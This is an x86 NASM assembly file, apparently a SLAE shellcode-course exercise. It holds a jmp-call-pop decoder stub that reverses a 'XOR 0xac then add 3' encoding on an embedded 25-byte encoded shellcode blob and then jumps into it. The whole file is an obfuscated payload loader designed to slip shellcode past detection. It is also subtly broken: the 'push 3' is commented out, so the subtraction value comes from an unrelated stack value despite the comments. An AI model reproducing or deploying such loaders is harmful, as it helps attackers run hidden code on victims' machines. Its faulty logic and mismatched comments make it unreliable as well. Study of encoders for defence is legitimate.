; Filename: decoder.nasm
; Author: SLAE-14209
; Decoder for "XOR with 0xac and after that add 3 to every byte"

global _start

section .text
_start:
  jmp short call_decoder
  
decoder:
  pop edi                         ; get address of encoded shellcode
  xor ecx, ecx                    ; zeroize ECX register
  mov cl, 25                      ; counter = 25 (length of shellcode)
  xor edx, edx                    ; zeroize EDX register
 ; push 3                          ; we added 3 to every byte
  pop edx                         ; subtract from each byte

decode:
  xor ebx, ebx
  mov bl, byte [edi]              ; save byte from stact to bl
  sub bl, dl                      ; subtract 3 from every byte
  xor bl, 0xac                    ; xor bl by 0xac
  
  mov byte [edi], bl              ; save byte from stact to bl
  inc edi                         ; switch to next byte
  loop decode
  jmp short EncodedShellcode

call_decoder:

  call decoder  
  EncodedShellcode: db 0x37,0xc8,0x58,0x70,0x2d,0x2d,0x79,0x70,0x70,0x2d,0x6a,0x6f,0x6e,0x8f,0xe9,0x58,0x8f,0xea,0x59,0x8f,0xe7,0xb8,0x11,0xcb,0x88
